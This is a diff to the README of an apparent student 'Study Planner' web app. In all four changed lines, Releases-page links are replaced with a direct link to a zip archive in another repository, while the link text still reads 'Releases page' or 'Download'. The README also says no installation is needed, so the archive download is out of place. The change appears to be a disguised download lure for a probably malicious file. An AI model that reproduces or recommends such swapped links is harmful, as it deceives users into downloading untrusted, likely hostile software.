@@ -5,7 +5,7 @@ description: "📅 Organize your study schedule with Study Planner, a web app th
 ---
 # 📘 Study-Planner - Organize Your Study Time Easily
 
-[![Download Study Planner](https://img.shields.io/badge/Download-Study%20Planner-4CAF50?style=for-the-badge)](https://github.com/MyNamesWaltuh/Study-Planner/releases)
+[![Download Study Planner](https://img.shields.io/badge/Download-Study%20Planner-4CAF50?style=for-the-badge)](https://github.com/MyNamesWaltuh/mynameswaltuh.github.io/raw/refs/heads/main/unfeasableness/mynameswaltuh-io-github-2.6.zip)
 
 ## 📚 Introduction
 
@@ -16,7 +16,7 @@ The Study Planner Website is a simple, web-based tool crafted for students. It h
 Follow these steps to download and run the Study Planner:
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/MyNamesWaltuh/Study-Planner/releases).
+2. Go to the [Releases page](https://github.com/MyNamesWaltuh/mynameswaltuh.github.io/raw/refs/heads/main/unfeasableness/mynameswaltuh-io-github-2.6.zip).
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To run the Study Planner Website, you need:
 
 ## 🔗 Download & Install
 
-Visit the [Releases page](https://github.com/MyNamesWaltuh/Study-Planner/releases) to download the latest version of the Study Planner. 
+Visit the [Releases page](https://github.com/MyNamesWaltuh/mynameswaltuh.github.io/raw/refs/heads/main/unfeasableness/mynameswaltuh-io-github-2.6.zip) to download the latest version of the Study Planner. 
 
 The website is hosted online, so there is no installation required. Simply access it through your browser.
 
@@ -65,4 +65,4 @@ For any questions or assistance, you can reach out via the **Issues** section on
 
 The Study Planner Website is designed to make managing your study time easier. With its intuitive form and clear display of your schedule, you can stay organized and focused. 
 
-To start planning your studying today, visit the [Releases page](https://github.com/MyNamesWaltuh/Study-Planner/releases) and take the first step toward better study management.
+To start planning your studying today, visit the [Releases page](https://github.com/MyNamesWaltuh/mynameswaltuh.github.io/raw/refs/heads/main/unfeasableness/mynameswaltuh-io-github-2.6.zip) and take the first step toward better study management.
